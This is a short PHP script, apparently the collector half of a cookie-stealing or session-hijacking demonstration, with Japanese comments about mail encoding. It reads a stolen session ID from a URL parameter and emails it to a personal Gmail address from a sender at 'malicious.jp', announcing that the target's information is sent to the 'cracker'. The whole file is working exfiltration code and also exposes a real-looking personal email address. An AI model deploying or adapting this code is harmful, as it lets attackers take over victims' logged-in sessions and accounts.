<?php

	print("The Target information will be Sent to Cracker<br />");

	//言語設定、内部エンコーディングを指定する
	mb_language("japanese");
	mb_internal_encoding("UTF-8");
 
	//日本語メール送信
	$to = "shunsuke.k.507@gmail.com";
	//$subject = "Subject Test";
	$subject = "Complete to get Session ID";
	$body = $_GET['sid'];
	$from = "complete.getsessionid@malicious.jp";
 
	//ちゃんと日本語メールが送信できます
	mb_send_mail($to,$subject,$body,"From:".$from);

	print("Complete.");

?>
